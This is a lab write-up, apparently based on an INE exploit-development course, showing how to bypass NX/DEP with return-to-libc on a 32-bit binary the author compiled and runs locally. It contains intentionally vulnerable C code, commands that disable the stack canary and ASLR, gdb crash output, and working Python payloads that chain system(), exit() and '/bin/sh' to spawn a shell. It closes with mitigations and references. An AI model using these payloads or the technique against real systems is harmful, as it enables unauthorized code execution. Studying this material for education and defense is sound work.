---
title: "NX Bit Bypass with ret2libc"
date: 2022-03-14
category: "dep-nx-bypass"
difficulty: "advanced"
source: "INE"
tags: [INE, advanced, ret2libc, dep, nx]
excerpt: "Defeating the NX bit by returning into libc: chaining system() + exit() + /bin/sh instead of executing injected shellcode."
cover: "/writeups/nx-bypass-ret2libc/image1.png"
draft: false
---

> This write-up is security-education material. The target binary is one I compiled and run locally for learning purposes. Only ever apply these techniques to systems you own or are explicitly authorized to test.

# 1. What is No Execute

## 1.1 The NX / DEP defence

- The NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data, a feature normally only found in Harvard architecture processors. However, the NX bit is being increasingly used in conventional von Neumann architecture processors for security reasons.

- Concretely, the kernel marks the stack and the heap as **readable + writable but not executable** (`rw-` instead of `rwx`). The CPU enforces this per memory page: the moment the instruction pointer is set to an address inside a non-executable page, the MMU raises a fault and the kernel kills the process with `SIGSEGV`.

- On Windows the same idea is marketed as **Data Execution Prevention (DEP)**. On Linux you will sometimes see it referred to as "NX", "DEP", or "W^X" (write XOR execute) — they all describe the same mitigation.

- You can confirm the protection on a binary with `checksec` (peda/pwntools) — look for `NX: NX enabled`. You can also see it at runtime in `/proc/<pid>/maps`: the line for `[stack]` will show `rw-p` rather than `rwxp`.

## 1.2 Why classic shellcode injection breaks

The classic stack overflow attack places shellcode **inside the buffer**, then overwrites the saved return address so execution jumps back into that buffer. With NX enabled this fails: the buffer lives on the stack, the stack page is non-executable, so as soon as `EIP` lands on our bytes the CPU faults. (You will see exactly this happen in section 2.3 — the crash address *is* our controlled value, but it never executes.)

## 1.3 The ret2libc idea

NX stops us *executing data*. It does **not** stop us redirecting execution to code that is already legitimately executable — the program's own code and, more usefully, the shared C library (`libc`) that is mapped into every process.

`libc` already contains `system()`. If we can make the program "return into" `system()` with the argument `"/bin/sh"`, we get a shell without ever executing a single byte of our own code. This is **return-to-libc (ret2libc)**; the variant that targets `system()` specifically is sometimes called **ret2system (ret2sys)**. That is the technique used in this report.

To make the call land cleanly we need to understand the 32-bit cdecl stack layout, which is covered next.

## 1.4 32-bit calling convention crash course

On x86 (32-bit, cdecl — what `gcc -m32` produces here) a function call works like this:

1. The caller pushes arguments onto the stack, right-to-left.
2. `call func` pushes the **return address** (where to resume after the function) and jumps to `func`.
3. So at the instant `func` starts executing, the stack looks like:

```
ESP  ->  return address      <- where func returns to when it does `ret`
ESP+4 -> arg1
ESP+8 -> arg2
...
```

When we overflow the buffer and overwrite the saved return address with the address of `system`, the CPU "returns" into `system` as if it had just been `call`-ed. `system` therefore expects the **very next 4 bytes** to be its return address, and the 4 bytes after that to be its first argument. That is exactly why the ret2libc payload is laid out as:

```
[ padding ] [ &system ] [ &exit ] [ &"/bin/sh" ]
   ^buffer     ^new EIP    ^where    ^arg1 to system
                           system
                           returns
```

- `&system` — overwrites the saved return address, so the function "returns" straight into `system()`.
- `&exit` — acts as `system()`'s return address. After the shell exits, `system()` returns here; jumping to `exit()` makes the process exit cleanly instead of crashing with garbage `EIP` (which would look like a failed exploit and can also kill the shell early).
- `&"/bin/sh"` — `system()`'s first argument, picked up from `ESP+4` exactly as the convention dictates. (Any string containing `/bin/sh` or `/bin/bash` already present in libc works.)

Return-to-library-C (ret2libc) and return-to-system (ret2sys) are the techniques used to bypass the No-Execute bit, and are what I'll demonstrate below.
----------
# 2. NX Bypass
## 2.1 Building Up Environment

This is the source code we will use for exploit example:

```c
#include <stdio.h>
#include <unistd.h>

int overflow(){
  char buf[500];
  int userinput;
  userinput = read(0, buf, 700);
  printf("\nUser provided %d bytes.\nBuffer content is: %s\n", userinput, buf);
  return 0;
}

int main(){
  overflow();
  return 0;
}
```

The bug is in `overflow()`: `buf` is 500 bytes but `read()` is told to read up to **700** bytes. Those extra 200 bytes overflow `buf`, run past the saved frame pointer, and overwrite the saved return address — the classic linear stack overflow.

Build the source code:

```bash
gcc vulnerable.c -m32 -fno-stack-protector -o vulnerable
```

What each flag does and why it matters here:

- `-m32` — build a 32-bit binary. The whole exploit relies on the 32-bit cdecl stack layout described in section 1.4 (arguments on the stack, not in registers like x86-64's System V ABI). This is why we use 4-byte (`pack('<I', ...)`) addresses throughout.
- `-fno-stack-protector` — disable the stack canary. The canary is a separate mitigation; leaving it on would make the program detect the overwrite and abort with `*** stack smashing detected ***` before we ever reach the return. We disable it so we can isolate and study **NX** alone.
- We deliberately do **not** pass `-z execstack`, so NX stays enabled — that is the whole point of this lab.

Make sure the machine has ASLR turned off. To turn it off:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Why disable ASLR here? With ASLR on, the libc base address (and therefore `system`, `exit`, and the `/bin/sh` string) is randomized on every run, so the hard-coded addresses in our payload would be wrong each time. Disabling it lets us focus on defeating NX in isolation. Defeating NX **and** ASLR together (by leaking a libc address at runtime) is a separate exercise — see the companion write-up *Lab 3 — ret2libc + ASLR Bypass via Info Leak*.

Use **checksec** to confirm that only the stack canary is disabled (NX should still read as enabled):

![image1.png](/writeups/nx-bypass-ret2libc/image1.png)

## 2.2. Getting An Interesting Target

The source declares `char buf[500]`, but the **offset to the saved return address is not 500**. Between the start of `buf` and the saved return address the compiler also places:

- any stack alignment padding the compiler adds around the buffer,
- other locals (here `int userinput`),
- the saved `EBP` (4 bytes on 32-bit).

Only *after* all of that comes the saved return address. So 500 is the source-level buffer size, not the overwrite offset — we have to measure the real offset empirically. (Spoiler from the next section: it turns out to be **516** for this build.)

First, confirm the buffer even overflows. Send 700 `A`s — the same count the vulnerable `read()` allows: ``python -c 'print("A"*700)' | ./vulnerable``.

![image2.png](/writeups/nx-bypass-ret2libc/image2.png)

Nothing obvious happened from a plain pipe, so try a bigger size / run it under controlled conditions to see what length triggers the crash:

![image3.png](/writeups/nx-bypass-ret2libc/image3.png)

To find the **exact** offset to the return address, open the program in a debugger. I use gdb-peda and its **cyclic pattern** feature: it generates a De Bruijn sequence where every 4-byte window is unique, so whatever 4 bytes land in `EIP` at the crash can be mapped back to a single offset. `pattern create 700` builds the input; after the crash, `pattern offset $eip` (or feeding the faulting `EIP` value) prints the offset. **(You can equally use `msf-pattern_create` / `msf-pattern_offset`, or pwntools' `cyclic` / `cyclic -l`.)**

![image4.png](/writeups/nx-bypass-ret2libc/image4.png)

![image5.png](/writeups/nx-bypass-ret2libc/image5.png)

## 2.3. Getting Return Address

The pattern step told us the offset is **516** bytes: 516 bytes of filler, then the next 4 bytes overwrite the saved return address. Sanity-check this with a clean marker — 516 `A`s followed by 4 `B`s. If the offset is right, the program crashes with `EIP = 0x42424242` (`"BBBB"`):
- `python -c "print('A'*516+'B'*4)" > input.txt`

![image6.png](/writeups/nx-bypass-ret2libc/image6.png)

![image7.png](/writeups/nx-bypass-ret2libc/image7.png)

So **0xffffd088** is where the buffer starts on the stack. (Note: knowing the buffer's stack address would matter for a *shellcode* attack — you'd return there to execute injected code. Under NX that page is non-executable, so this address is only useful here to demonstrate that NX blocks execution. The real ret2libc payload never returns to the stack at all; it returns into libc.)

To prove the offset and the NX behaviour, make a script that fills the buffer and sets the last 4 bytes to that buffer address: if NX were *off* the CPU would try to run our `A` bytes; with NX *on* it faults instead.

```python
#!/usr/bin/python2
from struct import pack

payload = ''
payload += 'A'*516
payload += pack('<I', 0xffffd088) # Start of A character

print payload
open('input.txt', 'wb').write(payload)
```

Run the file in gdb and determine if the program crashed ad  **0x41414141** or not:

```bash
gdb-peda$ r < input.txt
Starting program: vulnerable < input.txt

User provided 520 bytes.
Buffer content is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0x0
EDX: 0x1
ESI: 0xf7fa6000 --> 0x1e4d6c
EDI: 0xf7fa6000 --> 0x1e4d6c
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd290 --> 0xf7fa6000 --> 0x1e4d6c
EIP: 0xffffd088 ('A' <repeats 200 times>...)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffffd088:  inc    ecx
   0xffffd089:  inc    ecx
   0xffffd08a:  inc    ecx
   0xffffd08b:  inc    ecx
[------------------------------------stack-------------------------------------]
0000| 0xffffd290 --> 0xf7fa6000 --> 0x1e4d6c
0004| 0xffffd294 --> 0xf7fa6000 --> 0x1e4d6c
0008| 0xffffd298 --> 0x0
0012| 0xffffd29c --> 0xf7ddfe46 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd2a0 --> 0x1
0020| 0xffffd2a4 --> 0xffffd344 --> 0xffffd4b8 ("/home/th3knight/Desktop/learning/shellcoding/ine/DEP/vulnerable")
0024| 0xffffd2a8 --> 0xffffd34c --> 0xffffd4f8 ("SHELL=/bin/bash")
0028| 0xffffd2ac --> 0xffffd2d4 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xffffd088 in ?? ()
```

Read the crash carefully — this is the key observation of the whole lab:

- `EIP: 0xffffd088` — we **fully control** the instruction pointer; it is exactly the buffer address we supplied.
- `=> 0xffffd088: inc ecx` — the debugger is disassembling our `A` bytes (`0x41` = `inc ecx`). Execution **never advances past this point**.
- `Stopped reason: SIGSEGV` at `0xffffd088`.

So control of `EIP` is not the problem — **NX is**. The page at `0xffffd088` (the stack) is mapped non-executable, so the instant the CPU tries to fetch an instruction from our data it faults. This is precisely the wall ret2libc is designed to go around: instead of pointing `EIP` at our data, we will point it at code libc has already mapped as executable.

Re-run the debugger, breakpoint at main with `br *main`, and run so libc is fully mapped and we can read its symbol addresses.

Recall the payload layout from section 1.4:
- `padding(516) + &system + &exit + &"/bin/sh"`
- i.e. `Buffer_size + Execution_function_address + Return_address + Arguments_address`

Grab the three addresses we need. With ASLR off these are stable across runs:
- `print system` → address of `system()` in libc (this becomes the new `EIP`).
- `print exit` → address of `exit()` (this becomes `system()`'s return address, for a clean exit).
- `find "/bin/bash"` (or `find "/bin/sh"`) → address of a shell string already inside libc (this is `system()`'s argument). Using a string already in libc avoids having to place `/bin/sh` ourselves and dealing with its address.

![image8.png](/writeups/nx-bypass-ret2libc/image8.png)

## 2.4 Proof of Concept (PoC)

```python
#!/usr/bin/python2

from struct import pack

payload = ''
payload += 'A'*516
payload += pack('<I', 0xf7e06000) # System_func address @@ exec_function
payload += pack('<I', 0xf7df8950) # Exit_func address @@ ret_func
payload += pack('<I', 0xf7f4d338) # Arguments address

print payload
```

Mapping the payload back to the calling convention from section 1.4:

| Offset in payload | Bytes | Role at the moment `overflow()` returns |
| --- | --- | --- |
| `0` – `515` | `'A'*516` | Filler up to the saved return address |
| `516` – `519` | `&system` | Overwrites saved return → CPU "returns" into `system()` |
| `520` – `523` | `&exit` | Sits where `system()` expects *its* return address |
| `524` – `527` | `&"/bin/sh"` | `system()`'s 1st argument, read from `ESP+4` |

![image9.png](/writeups/nx-bypass-ret2libc/image9.png)

Running `./exploit.py | ./vulnerable` on its own appears to do nothing: the payload triggers `system("/bin/sh")`, the shell spawns — but its stdin is the closed pipe, so it reads EOF and exits immediately before we can type anything. Keep the input stream open by appending `cat`, which holds stdin open and forwards our keystrokes into the spawned shell:
- `(./exploit.py ; cat) | ./vulnerable`

![image10.png](/writeups/nx-bypass-ret2libc/image10.png)

We now have an interactive shell — NX has been bypassed without executing a single injected byte.

-----------------
# 3. Troubleshooting & notes

A few things that commonly go wrong when reproducing this:

- **Wrong offset.** If `EIP` is not exactly your control value, re-derive the offset with the cyclic pattern rather than guessing. Compiler version, optimization level, and alignment all shift it; the `516` here is specific to this build.
- **`SIGSEGV` *inside* `system`/`exit`, not at your data.** Usually means one of the three addresses is stale (ASLR re-enabled, or addresses read from a different libc / different run). Re-read them with `print system` etc. under the same conditions you exploit in, and confirm ASLR is `0` in `/proc/sys/kernel/randomize_va_space`.
- **Shell spawns then dies instantly.** That is the closed-stdin problem — use the `(payload ; cat) | ./vulnerable` trick above.
- **`system()` argument is not a clean string.** `find` may return an address mid-string; make sure it points at the start of `"/bin/sh"`/`"/bin/bash"` with a NUL terminator after it.
- **Address contains a `0x00` byte.** `read()` is binary-safe so NUL bytes are fine here, but a `strcpy`/`gets`-based bug would truncate at the first NUL — something to watch for when porting this technique to other binaries.

# 4. Mitigations

From a defender's point of view, ret2libc is exactly why NX alone is insufficient. Layered mitigations that break this specific attack:

- **ASLR** (`randomize_va_space = 2`) — randomizes the libc base every run, so hard-coded `system`/`exit`/string addresses are wrong. (Defeated only with an additional info leak — see the companion ASLR write-up.)
- **Stack canary** (`-fstack-protector-strong`) — detects the saved-return overwrite before the function returns.
- **PIE + full RELRO** — randomizes the binary itself and hardens the GOT, raising the bar for the leak step.
- **Fortify source / safe APIs** — the root cause here is `read(0, buf, 700)` into a 500-byte buffer; bounding the length to `sizeof(buf)` removes the bug entirely.

-----------------
# 5. Reference

### 5.1 NX / DEP — the defence being bypassed

- [NX bit — Wikipedia](https://en.wikipedia.org/wiki/NX_bit) — what the no-execute bit is at the CPU level.
- [Executable-space protection — Wikipedia](https://en.wikipedia.org/wiki/Executable-space_protection) — the general W^X / DEP concept across OSes.
- [Data Execution Prevention — Microsoft](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention) — the Windows equivalent and its enforcement modes.

### 5.2 ret2libc / ret2system technique

- [Return-to-libc attack — Wikipedia](https://en.wikipedia.org/wiki/Return-to-libc_attack) — the canonical description of the technique used here.
- [Bypassing NX with return-to-libc — LiveOverflow](https://www.youtube.com/watch?v=m17mbS5b7vk) — video walkthrough of the same idea.
- [Return-oriented programming — Wikipedia](https://en.wikipedia.org/wiki/Return-oriented_programming) — the generalisation of ret2libc once you need to chain gadgets.
- [Phrack 58:4 — "The advanced return-into-lib(c) exploits"](http://phrack.org/issues/58/4.html) — the classic in-depth paper on chained ret2libc.

### 5.3 Calling convention & stack mechanics

- [x86 calling conventions — Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions) — why the payload is `&func + &ret + &arg` in `cdecl`.
- [System V ABI (i386)](https://gitlab.com/x86-psABIs/x86-64-ABI) — authoritative stack-layout/calling-convention spec.
- [`system(3)`](https://man7.org/linux/man-pages/man3/system.3.html) and [`exit(3)`](https://man7.org/linux/man-pages/man3/exit.3.html) — the libc functions being returned into.
- [Endianness — Wikipedia](https://en.wikipedia.org/wiki/Endianness) — why addresses are packed little-endian (`pack('<I', ...)`).

### 5.4 Tooling

- [GDB Documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/) — `print`, `find`, breakpoints, examining libc symbols.
- [peda](https://github.com/longld/peda), [pwndbg](https://github.com/pwndbg/pwndbg), [GEF](https://github.com/hugsy/gef) — GDB enhancements (`pattern create/offset`, `checksec`).
- [pwntools documentation](https://docs.pwntools.com/) — `cyclic`, `ELF`, `process`/`remote`, libc offset helpers.

### 5.5 Going further (NX + ASLR together)

- [Linux ASLR (`randomize_va_space`) — kernel.org](https://www.kernel.org/doc/Documentation/admin-guide/sysctl/kernel.rst) — why hard-coded libc addresses break with ASLR on.
- [ROP Emporium](https://ropemporium.com/) — guided practice for ret2libc and ROP chains.
- [Nightmare — guyinatuxedo](https://guyinatuxedo.github.io/) — free course covering ret2libc with info leaks.
- [Linux Exploit Development (INE)](https://my.ine.com/CyberSecurity/courses/eb1c83e7/linux-exploit-development) — the course this lab is based on.
- Companion write-up: *Lab 3 — ret2libc + ASLR Bypass via Info Leak* (defeating NX **and** ASLR together).
---
